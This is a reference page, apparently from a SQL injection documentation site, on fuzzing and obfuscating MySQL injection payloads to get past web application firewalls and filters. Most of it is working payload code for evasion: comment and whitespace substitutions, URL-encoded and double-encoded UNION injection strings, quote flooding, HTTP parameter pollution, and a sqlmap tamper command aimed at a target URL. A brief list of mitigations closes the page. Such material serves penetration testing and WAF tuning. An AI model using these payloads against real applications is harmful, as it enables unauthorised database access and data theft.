---
title: Fuzzing and Obfuscation
description: Techniques for bypassing WAFs and filters in MySQL injection
category: Advanced Techniques
order: 20
tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
lastUpdated: 2025-12-15
---

## Fuzzing and Obfuscation

Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.

### Comment Variations

MySQL supports various comment styles that can be inserted between SQL tokens (keywords, identifiers, operators). Note: comments cannot split keywords (e.g., `SEL/**/ECT` is invalid) - see [Keyword Splitting Myth](#keyword-splitting-myth).

```sql
-- Comments BETWEEN tokens (valid)
SELECT/*comment*/username,password/**/FROM/**/users

-- MySQL-specific hash comment (comments to end of line)
SELECT # comment
username FROM users WHERE id = 1

-- C-style comments
SELECT /* comment */ username FROM users

-- Executable comments (MySQL extension, content is executed)
SELECT /*! username */ FROM users
```

### Whitespace Manipulation

MySQL is generally flexible with whitespace, allowing creative formatting.

#### Allowed Intermediary Characters (Whitespace Alternatives)

These characters can substitute for spaces in MySQL queries:

| Hex  | Dec | Character          | URL Encoded |
| ---- | --- | ------------------ | ----------- |
| 0x09 | 9   | Horizontal Tab     | %09         |
| 0x0A | 10  | New Line (LF)      | %0A         |
| 0x0B | 11  | Vertical Tab       | %0B         |
| 0x0C | 12  | Form Feed/New Page | %0C         |
| 0x0D | 13  | Carriage Return    | %0D         |
| 0x20 | 32  | Space              | %20         |

**Note:** U+00A0 (Non-breaking Space / 0xA0) does NOT work as whitespace in MySQL's SQL lexer. Only ASCII whitespace characters (0x09–0x0D and 0x20) are valid for tokenization.

**Example payload:**

```text
'%0A%09UNION%0CSELECT%0BNULL%20%23
```

#### Characters Allowed After AND/OR

These characters can immediately follow `AND` or `OR` without spaces:

| Hex  | Character | Description |
| ---- | --------- | ----------- |
| 0x20 | (space)   | Space       |
| 0x2B | +         | Plus        |
| 0x2D | -         | Minus       |
| 0x7E | ~         | Tilde       |
| 0x21 | !         | Exclamation |
| 0x40 | @         | At sign     |

**Example payloads:**

```sql
-- Using + after OR
1 OR+1=1

-- Using - after AND
1 AND-1=-1

-- Using ~ after OR
1 OR~1

-- Using ! after AND
1 AND!0
```

#### Parentheses as Whitespace Alternatives

Parentheses can replace spaces around keywords and function calls:

```sql
-- No spaces needed with parentheses
UNION(SELECT(column)FROM(table))

-- Complex example
SELECT(username)FROM(users)WHERE(id=1)

-- Nested parentheses
(SELECT(username)FROM(users))
```

#### Whitespace Examples

```sql
-- Using tabs, newlines, and carriage returns
SELECT
username
FROM
users

-- Using vertical tab and form feed (less common but valid)
SELECT%0Busername%0CFROM%0Busers

-- Excessive whitespace
SELECT       username       FROM       users
```

### Case Variation

MySQL keywords are case-insensitive, but identifier case-sensitivity depends on the operating system:

```sql
-- Keywords can be any case
select username from users where id=1
SeLeCt username FrOm users WhErE id=1
```

**Note on identifier case sensitivity:**

- **Linux/Unix:** Table and database names are case-sensitive (filesystem-dependent)
- **Windows/macOS:** Table names are case-insensitive by default
- **Column names:** Always case-insensitive in MySQL

This means `SELECT * FROM USERS` may fail on Linux if the table was created as `users`.

### Operator Alternatives

Many MySQL operators have alternative representations:

```sql
-- OR alternatives
1 OR 1=1
1 || 1=1
1 OR '1'='1'

-- AND alternatives
1 AND 1=1
1 && 1=1

-- Equal alternatives
id=1
id<=>1
```

### String Representation

Strings can be represented in multiple ways:

```sql
-- Hex encoding
SELECT * FROM users WHERE username = 0x61646d696e -- 'admin' in hex

-- Using CHAR function
SELECT * FROM users WHERE username = CHAR(97, 100, 109, 105, 110) -- 'admin'

-- Concatenation
SELECT * FROM users WHERE username = CONCAT('ad', 'min')

-- Concatenation with functions
SELECT * FROM users WHERE username = CONCAT(LOWER('AD'), LOWER('MIN'))
```

### Numeric Representation

Numbers can be represented in various ways:

```sql
-- Mathematical expressions
SELECT * FROM users WHERE id = 1+0

-- Boolean conversions
SELECT * FROM users WHERE id = true+0 -- true = 1

-- Hexadecimal
SELECT * FROM users WHERE id = 0x1 -- hex for 1

-- Scientific notation
SELECT * FROM users WHERE id = 1e0
```

### Function Call Obfuscation

Function names can be obfuscated:

```sql
-- Using substrings to construct function names
SELECT * FROM users WHERE id = (SELECT 1)

-- Using prepared statements for dynamic execution
SET @x = 'SELECT * FROM users';
PREPARE stmt FROM @x;
EXECUTE stmt;
```

### UNION Query Obfuscation

UNION attacks can be obfuscated:

```sql
-- Adding redundant WHERE (version-dependent, see note below)
1 UNION SELECT 1,2,3 FROM dual WHERE 1=1

-- Using NULL values
1 UNION SELECT NULL,NULL,(SELECT username FROM users LIMIT 1)

-- Nested UNIONs with derived table
1 UNION (SELECT * FROM (SELECT 1,2,3)x)
```

**Note on WHERE without FROM:** `SELECT ... WHERE` without a FROM clause behaves differently across versions:

- MySQL 5.7: Requires FROM clause (use `FROM dual`) when using WHERE
- MySQL 8.0+: WHERE without FROM is allowed (`SELECT 1 WHERE 1=1` works)

### Encoding Bypasses

#### URL Encoding

```text
-- Standard URL encoding (RFC 3986)
%74able_%6eame → table_name

-- Double URL encoding (decoded twice by server)
%2574able_%256eame → table_name

-- Legacy %uXXXX encoding (non-standard, see note below)
%u0074able_%u006eame → table_name

-- Invalid hex encoding (ASP/IIS specific)
%tab%le_%na%me → table_name
```

**Note on `%uXXXX` encoding:** This is a legacy JavaScript escape format (`escape()`/`unescape()`), not RFC 3986 compliant. Modern servers don't reliably interpret it, but it may still work for WAF bypasses due to inconsistent decoding across layers (browser URL bar, proxy, WAF, application server). Standard Unicode in URLs uses UTF-8 percent-encoding (e.g., `é` = `%C3%A9`).

#### Comment Obfuscation with Newlines

Using newlines within comment sequences to bypass pattern matching:

```sql
-- Vulnerable query:
SELECT * FROM users WHERE id='[INPUT]' AND active=1

-- Injection payload (multi-line):
1'#
AND 0--
UNION SELECT 1,2,3

-- Resulting query (as MySQL sees it):
SELECT * FROM users WHERE id='1'#
AND 0--
UNION SELECT 1,2,3' AND active=1
```

The `#` comments out the rest of line 1, `AND 0--` is commented out by the preceding `#`, and `UNION SELECT` executes. The trailing `' AND active=1` becomes part of the commented/ignored portion. This breaks up the payload across multiple lines, evading single-line pattern matching by WAFs that scan line-by-line.

### Keyword Bypass Techniques

#### Spaces in Identifiers

MySQL allows spaces around dots in qualified names:

```sql
-- Add spaces around the dot
information_schema . tables
information_schema . columns
```

#### Backtick Escaping

Use backticks to quote identifiers:

```sql
-- Backtick-quoted identifiers
`information_schema`.`tables`
`information_schema`.`columns`
```

#### Version-Specific Execution

Wrap SQL in executable comments (MySQL-specific extension):

```sql
-- Always executed by MySQL, ignored by other DBs
/*! SELECT */ * FROM users

-- Version-conditional: only on MySQL >= 5.0.0
/*!50000 SELECT */ * FROM users
```

#### Symbol Spam

Using valid arithmetic operators to confuse WAFs:

```sql
-- Valid SQL using multiple operators
1 AND -+--+--+~0
1 AND -+--+--+~~((1))
```

#### Quote Flooding

Using excessive quotes to bypass WAFs that count quotes:

```sql
-- Using multiple quotes
SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
```

### Advanced MySQL-specific Bypasses

#### Using Information Schema

```sql
-- Alternative to 'users' table name
SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 0x7573657273 LIMIT 1)x -- 'users' in hex
```

#### Keyword Splitting Myth

Splitting keywords with inline comments (e.g., `SEL/**/ECT`) does NOT work and never has in any MySQL version. This is a widespread misconception in security literature.

```sql
-- VALID: Comments between complete tokens
SELECT/**/ username /**/FROM/**/ users

-- INVALID: Splitting keywords (syntax error)
SEL/**/ECT username FROM users      -- ERROR 1064

-- VALID: Spaces/comments around dots in qualified names
information_schema/**/./**/columns
```

Likely sources of confusion: executable comments (`/*! SELECT */`) which do work, and comments between tokens (`SELECT/**/username`) which is also valid.

#### HTTP Parameter Pollution

Some WAFs can be bypassed by splitting the payload across multiple parameters:

```text
?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3
```

### Practical Examples

#### Bypassing Simple Keyword Filters

If 'SELECT' is blocked:

```sql
-- Using MySQL executable comment
/*! SELECT */ username FROM users

-- Using alternate whitespace to break pattern matching
SELECT%09username%0AFROM%0Dusers

-- Using parentheses instead of spaces
(SELECT(username)FROM(users))
```

**Note:** String concatenation (`CONCAT('SEL','ECT')`) cannot be used to construct SQL keywords. Keywords must appear literally in the query; they cannot be dynamically built from strings.

#### Bypassing WAF Pattern Recognition

If basic injection patterns are blocked:

```sql
-- Complex nested logic
1 AND NOT 1=2 UNION ALL SELECT (CASE WHEN (1=1) THEN username ELSE password END), 2 FROM users

-- Mixing encoding techniques
1 AND 0x1=0x1 UNION SELECT UNHEX('73656C65637420757365726E616D652066726F6D20757365727320')
```

### Automated Fuzzing

Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:

```bash
sqlmap --url="http://target/page.php?id=1" --tamper=space2comment,charencode --random-agent
```

### Mitigation

To protect against obfuscation techniques:

1. Use parameterized queries instead of string concatenation
2. Implement a WAF with updated signatures
3. Use positive security models (whitelist valid patterns)
4. Limit the database user's privileges
5. Monitor and rate-limit suspicious queries
6. Use security testing tools to validate protections
